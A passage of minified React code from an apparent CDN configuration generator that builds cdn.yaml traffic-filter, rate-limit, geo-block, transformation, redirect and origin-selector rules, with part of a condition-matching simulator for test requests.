Countries"}),(0,i.jsx)("div",{className:"country-tags",children:null===(l=u.geoBlock)||void 0===l||null===(c=l.countries)||void 0===c?void 0:c.map(e=>(0,i.jsxs)("span",{className:"country-tag",children:[e,(0,i.jsx)("button",{onClick:()=>d(u.id,{geoBlock:Tt(Tt({},u.geoBlock),{},{countries:u.geoBlock.countries.filter(t=>t!==e)})}),children:"\xd7"})]},e))})]})]})]})},_t=e=>{var t;let{rule:n,updateRule:r,addAction:a,updateAction:s,deleteAction:o}=e;return(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsxs)("h4",{children:["requestTransformations"===n.type?"Request":"Response"," Actions"]}),"responseTransformations"===n.type&&(0,i.jsxs)("div",{className:"security-headers-quick",children:[(0,i.jsx)("span",{children:"Quick Add:"}),Object.entries(Ot).map(e=>{let[t,a]=e;return(0,i.jsx)("button",{className:"btn btn-ghost btn-xs",onClick:()=>{const e={id:Date.now(),type:"set",target:"respHeader",key:a.header,value:a.value};r(n.id,{actions:[...n.actions||[],e]})},children:a.name},t)})]}),null===(t=n.actions)||void 0===t?void 0:t.map((e,t)=>(0,i.jsxs)("div",{className:"action-row",children:[(0,i.jsxs)("select",{className:"form-select",value:e.type,onChange:t=>s(n.id,e.id,{type:t.target.value}),children:[(0,i.jsx)("option",{value:"set",children:"Set"}),(0,i.jsx)("option",{value:"unset",children:"Unset"}),(0,i.jsx)("option",{value:"transform",children:"Transform"})]}),(0,i.jsx)("select",{className:"form-select",value:e.target,onChange:t=>s(n.id,e.id,{target:t.target.value}),children:"requestTransformations"===n.type?(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("option",{value:"reqHeader",children:"Request Header"}),(0,i.jsx)("option",{value:"reqProperty",children:"Request Property"}),(0,i.jsx)("option",{value:"queryParam",children:"Query Parameter"}),(0,i.jsx)("option",{value:"var",children:"Variable"})]}):(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("option",{value:"respHeader",children:"Response Header"}),(0,i.jsx)("option",{value:"respProperty",children:"Response Property"}),(0,i.jsx)("option",{value:"var",children:"Variable"})]})}),(0,i.jsx)("input",{type:"text",className:"form-input",value:e.key,onChange:t=>s(n.id,e.id,{key:t.target.value}),placeholder:"Header-Name or property"}),"set"===e.type&&(0,i.jsx)("input",{type:"text",className:"form-input",value:e.value||"",onChange:t=>s(n.id,e.id,{value:t.target.value}),placeholder:"value"}),"transform"===e.type&&(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)("select",{className:"form-select form-select-sm",value:e.op||"replace",onChange:t=>s(n.id,e.id,{op:t.target.value}),children:[(0,i.jsx)("option",{value:"replace",children:"Replace"}),(0,i.jsx)("option",{value:"tolower",children:"To Lower"})]}),"tolower"!==e.op&&(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("input",{type:"text",className:"form-input",value:e.match||"",onChange:t=>s(n.id,e.id,{match:t.target.value}),placeholder:"regex pattern"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:e.replacement||"",onChange:t=>s(n.id,e.id,{replacement:t.target.value}),placeholder:"replacement"})]})]}),n.actions.length>1&&(0,i.jsx)("button",{className:"btn btn-ghost btn-icon delete",onClick:()=>o(n.id,e.id),children:(0,i.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),(0,i.jsx)("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]})})]},e.id)),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>a(n.id),children:"+ Add Action"})]})},Bt=e=>{let{rule:t,updateRule:n}=e;return(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsx)("h4",{children:"Redirect Configuration"}),(0,i.jsxs)("div",{className:"form-row",children:[(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Status Code"}),(0,i.jsx)("select",{className:"form-select",value:t.status,onChange:e=>n(t.id,{status:parseInt(e.target.value)}),children:Rt.map(e=>(0,i.jsxs)("option",{value:e.code,children:[e.code," - ",e.name]},e.code))})]}),(0,i.jsxs)("div",{className:"form-group",style:{flex:2},children:[(0,i.jsx)("label",{className:"form-label",children:"Location (URL)"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:t.location,onChange:e=>n(t.id,{location:e.target.value}),placeholder:"https://example.com/new-path or /relative-path"})]})]}),(0,i.jsxs)("p",{className:"form-hint",children:["\ud83d\udca1 Use ",(0,i.jsx)("code",{children:"{reqProperty: path}"})," to reference request properties in location"]})]})},zt=e=>{let{rule:t,updateRule:n}=e;return(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsx)("h4",{children:"Origin Configuration"}),(0,i.jsxs)("div",{className:"form-row",children:[(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Origin Type"}),(0,i.jsxs)("select",{className:"form-select",value:t.originType,onChange:e=>n(t.id,{originType:e.target.value}),children:[(0,i.jsx)("option",{value:"custom",children:"Custom Backend"}),(0,i.jsx)("option",{value:"aem",children:"AEM Origin (static)"})]})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Origin Name"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:t.originName,onChange:e=>n(t.id,{originName:e.target.value}),placeholder:"aem"===t.originType?"static":"my-backend"})]})]}),"custom"===t.originType&&(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)("div",{className:"form-row",children:[(0,i.jsxs)("div",{className:"form-group",style:{flex:2},children:[(0,i.jsx)("label",{className:"form-label",children:"Backend Domain"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:t.originDomain||"",onChange:e=>n(t.id,{originDomain:e.target.value}),placeholder:"api.example.com"})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Timeout (sec)"}),(0,i.jsx)("input",{type:"number",className:"form-input",value:t.timeout||60,onChange:e=>n(t.id,{timeout:parseInt(e.target.value)})})]})]}),(0,i.jsxs)("div",{className:"form-row",children:[(0,i.jsxs)("label",{className:"form-checkbox",children:[(0,i.jsx)("input",{type:"checkbox",checked:t.forwardHost,onChange:e=>n(t.id,{forwardHost:e.target.checked})}),(0,i.jsx)("span",{children:"Forward Host Header"})]}),(0,i.jsxs)("label",{className:"form-checkbox",children:[(0,i.jsx)("input",{type:"checkbox",checked:t.forwardCookie,onChange:e=>n(t.id,{forwardCookie:e.target.checked})}),(0,i.jsx)("span",{children:"Forward Cookies"})]}),(0,i.jsxs)("label",{className:"form-checkbox",children:[(0,i.jsx)("input",{type:"checkbox",checked:t.forwardAuthorization,onChange:e=>n(t.id,{forwardAuthorization:e.target.checked})}),(0,i.jsx)("span",{children:"Forward Authorization"})]})]})]}),(0,i.jsxs)("label",{className:"form-checkbox",children:[(0,i.jsx)("input",{type:"checkbox",checked:t.skipCache,onChange:e=>n(t.id,{skipCache:e.target.checked})}),(0,i.jsx)("span",{children:"Skip CDN Cache"})]})]})},Wt=e=>{let{onRulesGenerated:t}=e;const[n,a]=(0,r.useState)("trafficFilter"),[s,o]=(0,r.useState)([]),[l,c]=(0,r.useState)(""),[u,d]=(0,r.useState)("builder"),[p,h]=(0,r.useState)(!1),[f,m]=(0,r.useState)(!1),[g,y]=(0,r.useState)({}),v=function(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:n;const t={id:Date.now(),type:e,name:"".concat(e,"-rule-").concat(s.filter(t=>t.type===e).length+1),expanded:!0,conditions:[{id:Date.now(),property:"path",propertyType:"reqProperty",operator:"like",value:"/*"}],conditionLogic:"allOf"};switch(e){case"trafficFilter":return Tt(Tt({},t),{},{tier:"both",action:"log",wafFlags:[],rateLimit:null,geoBlock:{enabled:!1,countries:[]},alert:!1});case"requestTransformations":return Tt(Tt({},t),{},{actions:[{id:Date.now(),type:"set",target:"reqHeader",key:"",value:""}]});case"responseTransformations":return Tt(Tt({},t),{},{actions:[{id:Date.now(),type:"set",target:"respHeader",key:"",value:""}]});case"redirects":return Tt(Tt({},t),{},{status:301,location:"",locationTransform:null});case"originSelectors":return Tt(Tt({},t),{},{originName:"",originType:"custom",originDomain:"",forwardHost:!1,forwardCookie:!1,forwardAuthorization:!1,timeout:60,skipCache:!1});default:return t}},x=(0,r.useCallback)((e,t)=>{o(n=>n.map(n=>n.id===e?Tt(Tt({},n),t):n))},[]),b=e=>{o(s.filter(t=>t.id!==e))},w=e=>{const t=s.find(t=>t.id===e);if(t){const e=Tt(Tt({},JSON.parse(JSON.stringify(t))),{},{id:Date.now(),name:"".concat(t.name,"-copy"),expanded:!0});o([...s,e])}},k=e=>{const t=s.find(t=>t.id===e);t&&x(e,{conditions:[...t.conditions,{id:Date.now(),property:"path",propertyType:"reqProperty",operator:"like",value:""}]})},j=(e,t,n)=>{const r=s.find(t=>t.id===e);r&&x(e,{conditions:r.conditions.map(e=>e.id===t?Tt(Tt({},e),n):e)})},N=(e,t)=>{const n=s.find(t=>t.id===e);n&&n.conditions.length>1&&x(e,{conditions:n.conditions.filter(e=>e.id!==t)})},S=e=>{const t=s.find(t=>t.id===e);t&&t.actions&&x(e,{actions:[...t.actions,{id:Date.now(),type:"set",target:"requestTransformations"===t.type?"reqHeader":"respHeader",key:"",value:""}]})},C=(e,t,n)=>{const r=s.find(t=>t.id===e);r&&r.actions&&x(e,{actions:r.actions.map(e=>e.id===t?Tt(Tt({},e),n):e)})},A=(e,t)=>{const n=s.find(t=>t.id===e);n&&n.actions&&n.actions.length>1&&x(e,{actions:n.actions.filter(e=>e.id!==t)})},P=(e,t)=>{const n=s.find(t=>t.id===e);if(n){const r=n.wafFlags.includes(t)?n.wafFlags.filter(e=>e!==t):[...n.wafFlags,t];x(e,{wafFlags:r})}},T=function(e,t){const n=" ".repeat(arguments.length>2&&void 0!==arguments[2]?arguments[2]:8);if(1===e.length){const t=e[0];if("in"===t.operator||"notIn"===t.operator){const e=t.value.split(",").map(e=>'"'.concat(e.trim(),'"')).join(", ");return"".concat(n,"when:\n").concat(n,"  ").concat(t.propertyType,": ").concat(t.property,"\n").concat(n,"  ").concat(t.operator,": [").concat(e,"]\n")}return"".concat(n,"when:\n").concat(n,"  ").concat(t.propertyType,": ").concat(t.property,"\n").concat(n,"  ").concat(t.operator,': "').concat(t.value,'"\n')}let r="".concat(n,"when:\n").concat(n,"  ").concat(t,":\n");return e.forEach(e=>{if("in"===e.operator||"notIn"===e.operator){const t=e.value.split(",").map(e=>'"'.concat(e.trim(),'"')).join(", ");r+="".concat(n,"    - { ").concat(e.propertyType,": ").concat(e.property,", ").concat(e.operator,": [").concat(t,"] }\n")}else r+="".concat(n,"    - { ").concat(e.propertyType,": ").concat(e.property,", ").concat(e.operator,': "').concat(e.value,'" }\n')}),r},q=e=>{var t,n,r,a;let i="      - name: ".concat(e.name,"\n");const s=[...e.conditions];return e.tier&&"both"!==e.tier?s.unshift({propertyType:"reqProperty",property:"tier",operator:"equals",value:e.tier}):"both"===e.tier&&s.unshift({propertyType:"reqProperty",property:"tier",operator:"in",value:"author,publish"}),null!==(t=e.geoBlock)&&void 0!==t&&t.enabled&&(null===(n=e.geoBlock.countries)||void 0===n?void 0:n.length)>0&&s.push({propertyType:"reqProperty",property:"clientCountry",operator:"in",value:e.geoBlock.countries.join(",")}),i+=T(s,e.conditionLogic),null!==(r=e.rateLimit)&&void 0!==r&&r.limit&&(i+="        rateLimit:\n",i+="          limit: ".concat(e.rateLimit.limit,"\n"),i+="          window: ".concat(e.rateLimit.window||10,"\n"),i+="          count: ".concat(e.rateLimit.count||"all","\n"),e.rateLimit.penalty&&(i+="          penalty: ".concat(e.rateLimit.penalty,"\n")),i+="          groupBy:\n            - reqProperty: clientIp\n"),(null===(a=e.wafFlags)||void 0===a?void 0:a.length)>0?(i+="        action:\n",i+="          type: ".concat(e.action,"\n"),i+="          wafFlags:\n",e.wafFlags.forEach(e=>{i+="            - ".concat(e,"\n")})):i+="        action: ".concat(e.action,"\n"),e.alert&&(i+="        alert: true\n"),i+="\n",i},E=e=>{var t;let n="      - name: ".concat(e.name,"\n");return n+=T(e.conditions,e.conditionLogic),n+="        actions:\n",null===(t=e.actions)||void 0===t||t.forEach(e=>{"transform"===e.type?(n+="          - type: transform\n",n+="            ".concat(e.target,": ").concat(e.key,"\n"),n+="            op: ".concat(e.op||"replace","\n"),e.match&&(n+='            match: "'.concat(e.match,'"\n')),void 0!==e.replacement&&(n+='            replacement: "'.concat(e.replacement,'"\n'))):(n+="          - type: ".concat(e.type,"\n"),n+="            ".concat(e.target,": ").concat(e.key,"\n"),"set"===e.type&&e.value&&(n+='            value: "'.concat(e.value,'"\n')))}),n+="\n",n},L=e=>{var t;let n="      - name: ".concat(e.name,"\n");return n+=T(e.conditions,e.conditionLogic),n+="        actions:\n",null===(t=e.actions)||void 0===t||t.forEach(e=>{n+="          - type: ".concat(e.type,"\n"),n+="            ".concat(e.target,": ").concat(e.key,"\n"),"set"===e.type&&e.value&&(n+='            value: "'.concat(e.value,'"\n'))}),n+="\n",n},R=e=>{let t="      - name: ".concat(e.name,"\n");return t+=T(e.conditions,e.conditionLogic),t+="        action:\n",t+="          type: redirect\n",t+="          status: ".concat(e.status,"\n"),t+='          location: "'.concat(e.location,'"\n'),t+="\n",t},O=e=>{let t="      - name: ".concat(e.name,"\n");return t+=T(e.conditions,e.conditionLogic),t+="        action:\n","aem"===e.originType?(t+="          type: selectAemOrigin\n",t+="          originName: ".concat(e.originName||"static","\n")):(t+="          type: selectOrigin\n",t+="          originName: ".concat(e.originName,"\n")),e.skipCache&&(t+="          skipCache: true\n"),t+="\n",t},F=s.filter(e=>e.type===n);return(0,i.jsxs)("div",{className:"rules-generator",children:[(0,i.jsxs)("div",{className:"generator-header",children:[(0,i.jsxs)("div",{children:[(0,i.jsxs)("h1",{children:[(0,i.jsx)("svg",{width:"28",height:"28",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"})}),"CDN Configuration Generator"]}),(0,i.jsx)("p",{children:"Build traffic filter rules, transformations, redirects, and origin selectors visually"})]}),(0,i.jsxs)("div",{className:"generator-actions",children:[(0,i.jsxs)("button",{className:"btn btn-ghost",onClick:()=>m(!f),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("path",{d:"M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"}),(0,i.jsx)("line",{x1:"12",y1:"17",x2:"12.01",y2:"17"})]}),"Condition Help"]}),(0,i.jsxs)("button",{className:"btn btn-secondary",onClick:()=>h(!p),children:[(0,i.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2"})}),"Templates"]})]})]}),(0,i.jsx)("div",{className:"rule-type-selector",children:Object.entries(qt).map(e=>{let[t,r]=e;return(0,i.jsxs)("button",{className:"rule-type-btn ".concat(n===t?"active":""),onClick:()=>a(t),children:[(0,i.jsx)("span",{className:"rule-type-name",children:r.name}),(0,i.jsxs)("span",{className:"rule-type-desc",children:[r.description.slice(0,50),"..."]}),s.filter(e=>e.type===t).length>0&&(0,i.jsx)("span",{className:"rule-type-count",children:s.filter(e=>e.type===t).length})]},t)})}),f&&(0,i.jsxs)("div",{className:"help-panel card animate-slide-up",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsx)("h3",{className:"card-title",children:"Condition Structure Reference"}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>m(!1),children:"\xd7"})]}),(0,i.jsx)("div",{className:"help-grid",children:Object.entries(It).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"help-example",children:[(0,i.jsx)("h4",{children:n.name}),(0,i.jsx)("pre",{children:n.yaml}),(0,i.jsx)("p",{children:n.explanation})]},t)})}),(0,i.jsxs)("div",{className:"help-section",children:[(0,i.jsx)("h4",{children:"Available Operators"}),(0,i.jsx)("div",{className:"operators-grid",children:Object.entries(Et).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"operator-item",children:[(0,i.jsx)("code",{children:n.name}),(0,i.jsx)("span",{children:n.description})]},t)})})]})]}),p&&(0,i.jsxs)("div",{className:"templates-panel card animate-slide-up",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsx)("h3",{className:"card-title",children:"Rule Templates"}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>h(!1),children:"\xd7"})]}),(0,i.jsxs)("div",{className:"templates-grid",children:[Object.entries(Ft).filter(e=>{let[,t]=e;return t.type===n}).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"template-card",onClick:()=>(e=>{const t=Ft[e];if(t){const n=v(t.type);n.name=e,n.templateYaml=t.yaml,n.explanation=t.explanation,o([...s,n])}h(!1)})(t),children:[(0,i.jsx)("h4",{children:n.name}),(0,i.jsx)("p",{children:n.description}),(0,i.jsxs)("pre",{children:[n.yaml.slice(0,150),"..."]}),(0,i.jsx)("span",{className:"template-cta",children:"Use Template \u2192"})]},t)}),0===Object.entries(Ft).filter(e=>{let[,t]=e;return t.type===n}).length&&(0,i.jsx)("p",{className:"no-templates",children:"No templates for this rule type. Select another type or create a custom rule."})]})]}),(0,i.jsxs)("div",{className:"generator-tabs",children:[(0,i.jsxs)("button",{className:"tab ".concat("builder"===u?"active":""),onClick:()=>d("builder"),children:[(0,i.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"})}),"Rule Builder"]}),(0,i.jsxs)("button",{className:"tab ".concat("output"===u?"active":""),onClick:()=>d("output"),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"}),(0,i.jsx)("polyline",{points:"14 2 14 8 20 8"})]}),"Generated YAML",l&&(0,i.jsx)("span",{className:"tab-badge",children:"Ready"})]})]}),"builder"===u&&(0,i.jsxs)("div",{className:"builder-content",children:[(0,i.jsxs)("div",{className:"builder-toolbar",children:[(0,i.jsxs)("button",{className:"btn btn-primary",onClick:()=>{o([...s,v()])},children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("line",{x1:"12",y1:"5",x2:"12",y2:"19"}),(0,i.jsx)("line",{x1:"5",y1:"12",x2:"19",y2:"12"})]}),"Add ",qt[n].name.replace(" Rules","")," Rule"]}),s.length>0&&(0,i.jsxs)("button",{className:"btn btn-secondary",onClick:()=>{var e,t,n,r,a;let i='kind: "CDN"\nversion: "1"\ndata:\n';const o=s.reduce((e,t)=>(e[t.type]||(e[t.type]=[]),e[t.type].push(t),e),{});if((null===(e=o.trafficFilter)||void 0===e?void 0:e.length)>0&&(i+="  trafficFilters:\n    rules:\n",o.trafficFilter.forEach(e=>{i+=q(e)})),(null===(t=o.requestTransformations)||void 0===t?void 0:t.length)>0&&(i+="  requestTransformations:\n    rules:\n",o.requestTransformations.forEach(e=>{i+=E(e)})),(null===(n=o.responseTransformations)||void 0===n?void 0:n.length)>0&&(i+="  responseTransformations:\n    rules:\n",o.responseTransformations.forEach(e=>{i+=L(e)})),(null===(r=o.redirects)||void 0===r?void 0:r.length)>0&&(i+="  redirects:\n    rules:\n",o.redirects.forEach(e=>{i+=R(e)})),(null===(a=o.originSelectors)||void 0===a?void 0:a.length)>0){i+="  originSelectors:\n    rules:\n";const e=[];o.originSelectors.forEach(t=>{i+=O(t),"custom"===t.originType&&t.originName&&t.originDomain&&e.push(t)}),e.length>0&&(i+="    origins:\n",e.forEach(e=>{i+="      - name: ".concat(e.originName,"\n"),i+="        domain: ".concat(e.originDomain,"\n"),e.forwardHost&&(i+="        forwardHost: true\n"),e.forwardCookie&&(i+="        forwardCookie: true\n"),e.forwardAuthorization&&(i+="        forwardAuthorization: true\n"),60!==e.timeout&&(i+="        timeout: ".concat(e.timeout,"\n"))}))}c(i),d("output")},children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("polyline",{points:"16 18 22 12 16 6"}),(0,i.jsx)("polyline",{points:"8 6 2 12 8 18"})]}),"Generate YAML (",s.length," rules)"]})]}),0===F.length?(0,i.jsxs)("div",{className:"empty-state",children:[(0,i.jsx)("svg",{width:"64",height:"64",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",children:(0,i.jsx)("path",{d:"M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"})}),(0,i.jsxs)("h3",{children:["No ",qt[n].name," Yet"]}),(0,i.jsx)("p",{children:qt[n].description}),(0,i.jsx)("p",{className:"hint",children:'\ud83d\udca1 Click "Add Rule" or use "Templates" for common patterns'})]}):(0,i.jsx)("div",{className:"rules-list",children:F.map((e,t)=>(0,i.jsx)(Mt,{rule:e,index:t,updateRule:x,deleteRule:b,duplicateRule:w,addCondition:k,updateCondition:j,deleteCondition:N,addAction:S,updateAction:C,deleteAction:A,toggleWafFlag:P},e.id))})]}),"output"===u&&(0,i.jsxs)("div",{className:"output-content card",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsx)("h3",{className:"card-title",children:"cdn.yaml"}),l&&(0,i.jsxs)("div",{className:"output-actions",children:[(0,i.jsxs)("button",{className:"btn btn-secondary btn-sm",onClick:()=>{navigator.clipboard.writeText(l)},children:[(0,i.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("rect",{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"}),(0,i.jsx)("path",{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"})]}),"Copy"]}),(0,i.jsxs)("button",{className:"btn btn-primary btn-sm",onClick:()=>{const e=new Blob([l],{type:"text/yaml"}),t=URL.createObjectURL(e),n=document.createElement("a");n.href=t,n.download="cdn.yaml",document.body.appendChild(n),n.click(),document.body.removeChild(n)},children:[(0,i.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"}),(0,i.jsx)("polyline",{points:"7 10 12 15 17 10"}),(0,i.jsx)("line",{x1:"12",y1:"15",x2:"12",y2:"3"})]}),"Download"]})]})]}),l?(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)("div",{className:"deployment-note",children:[(0,i.jsx)("strong",{children:"\ud83d\udccb Deployment Steps:"}),(0,i.jsxs)("ol",{children:[(0,i.jsxs)("li",{children:["Save as ",(0,i.jsx)("code",{children:"cdn.yaml"})," in your ",(0,i.jsx)("code",{children:"config"})," folder"]}),(0,i.jsx)("li",{children:"Deploy via Cloud Manager config pipeline"}),(0,i.jsx)("li",{children:"Monitor CDN logs for rule matches"})]})]}),(0,i.jsx)("pre",{className:"code-block yaml-output",children:l})]}):(0,i.jsxs)("div",{className:"empty-state",children:[(0,i.jsx)("h3",{children:"No YAML Generated Yet"}),(0,i.jsx)("p",{children:'Create rules and click "Generate YAML"'})]})]})]})};const Ht=()=>{var e,t,n;const[a,s]=(0,r.useState)(""),[o,l]=(0,r.useState)({path:"/jp/products/page",url:"https://preview.your-domain.com/jp/products/page",queryString:"",method:"GET",domain:"preview.your-domain.com",tier:"publish",clientIp:"203.0.113.50",clientCountry:"US",clientRegion:"CA",userAgent:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",referer:"",protocol:"https",headers:{}}),[c,u]=(0,r.useState)(null),[d,p]=(0,r.useState)(null),[h,f]=(0,r.useState)("config"),m=[{id:"requestTransformations",name:"Request Transformations",icon:"\ud83d\udd04",description:"Modify incoming request headers, paths, parameters"},{id:"trafficFilters",name:"Traffic Filter Rules (WAF)",icon:"\ud83d\udee1\ufe0f",description:"Block or log malicious traffic"},{id:"responseTransformations",name:"Response Transformations",icon:"\ud83d\udce4",description:"Modify outgoing response headers"},{id:"originSelectors",name:"Origin Selectors",icon:"\ud83c\udfaf",description:"Route to different backend origins"},{id:"redirects",name:"Redirects",icon:"\u21aa\ufe0f",description:"Server-side redirects (301/302)"}],g=(e,t)=>!!Array.isArray(t)&&t.some(t=>((e,t)=>{try{if(!t.includes("/"))return e===t;const[n,r]=t.split("/"),a=~(2**(32-parseInt(r))-1),i=e=>{const t=e.split(".");return 4!==t.length?0:t.reduce((e,t)=>(e<<8)+parseInt(t,10),0)>>>0};return(i(e)&a)===(i(n)&a)}catch(n){return!1}})(e,t)),y=function(e,t){let n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:0;try{if(!e)return{matches:!0,reason:"No condition (always matches)",details:[]};if("*"===e)return{matches:!0,reason:"Wildcard condition - matches all requests",details:[]};if(e.allOf){const r=e.allOf.map((e,r)=>Tt({index:r+1},y(e,t,n+1))),a=r.every(e=>e.matches),i=r.filter(e=>!e.matches);return{matches:a,type:"allOf",reason:a?"\u2713 ALL ".concat(r.length," conditions matched"):"\u2717 ".concat(i.length," of ").concat(r.length," conditions failed"),details:r,failedConditions:i}}if(e.anyOf){const r=e.anyOf.map((e,r)=>Tt({index:r+1},y(e,t,n+1))),a=r.some(e=>e.matches),i=r.filter(e=>e.matches);return{matches:a,type:"anyOf",reason:a?"\u2713 ".concat(i.length," of ").concat(r.length," conditions matched (only 1 needed)"):"\u2717 None of ".concat(r.length," conditions matched"),details:r}}const a=e.reqProperty;let i=v(t,a,e);if(void 0!==e.equals){const t=String(i)===String(e.equals);return{matches:t,property:a,operator:"equals",expected:e.equals,actual:i,reason:t?"\u2713 ".concat(a,' equals "').concat(e.equals,'"'):"\u2717 ".concat(a,' "').concat(i,'" does not equal "').concat(e.equals,'"')}}if(void 0!==e.notEquals){const t=String(i)!==String(e.notEquals);return{matches:t,property:a,operator:"notEquals",expected:e.notEquals,actual:i,reason:t?"\u2713 ".concat(a,' "').concat(i,'" is not equal to "').concat(e.notEquals,'"'):"\u2717 ".concat(a,' "').concat(i,'" equals "').concat(e.notEquals,'" (should not)')}}if(void 0!==e.like){const t=e.like.replace(/[.+^${}()|[\]\\]/g,"\\$&").replace(/\*/g,".*").replace(/\?/g,"."),n=new RegExp("^".concat(t,"$"),"i").test(i);return{matches:n,property:a,operator:"like",pattern:e.like,actual:i,reason:n?"\u2713 ".concat(a,' "').concat(i,'" matches glob pattern "').concat(e.like,'"'):"\u2717 ".concat(a,' "').concat(i,'" does not match glob pattern "').concat(e.like,'"')}}if(void 0!==e.notLike){const t=e.notLike.replace(/[.+^${}()|[\]\\]/g,"\\$&").replace(/\*/g,".*").replace(/\?/g,"."),n=!new RegExp("^".concat(t,"$"),"i").test(i);return{matches:n,property:a,operator:"notLike",pattern:e.notLike,actual:i,reason:n?"\u2713 ".concat(a,' "').concat(i,'" does not match glob pattern "').concat(e.notLike,'"'):"\u2717 ".concat(a,' "').concat(i,'" matches glob pattern "').concat(e.notLike,'" (should not)')}}if(void 0!==e.matches)try{const t=new RegExp(e.matches).test(i);return{matches:t,property:a,operator:"matches",pattern:e.matches,actual:i,reason:t?"\u2713 ".concat(a,' "').concat(i,'" matches regex /').concat(e.matches,"/"):"\u2717 ".concat(a,' "').concat(i,'" does not match regex /').concat(e.matches,"/")}}catch(r){return{matches:!1,reason:"Invalid regex: ".concat(e.matches),error:r.message}}if(void 0!==e.doesNotMatch)try{const t=!new RegExp(e.doesNotMatch).test(i);return{matches:t,property:a,operator:"doesNotMatch",pattern:e.doesNotMatch,actual:i,reason:t?"\u2713 ".concat(a,' "').concat(i,'" does not match regex /').concat(e.doesNotMatch,"/"):"\u2717 ".concat(a,' "').concat(i,'" matches regex /').concat(e.doesNotMatch,"/ (should not)")}}catch(r){return{matches:!1,reason:"Invalid regex",error:r.message}}if(void 0!==e.in){let t;t="clientIp"===a?g(i,e.in):e.in.includes(i);const n=e.in.length>5?"[".concat(e.in.slice(0,3).join(", "),", ... +").concat(e.in.length-3," more]"):"[".concat(e.in.join(", "),"]");return{matches:t,property:a,operator:"in",expected:e.in,actual:i,reason:t?"\u2713 ".concat(a,' "').concat(i,'" is in list ').concat(n):"\u2717 ".concat(a,' "').concat(i,'" is not in list ').concat(n)}}if(void 0!==e.notIn){let 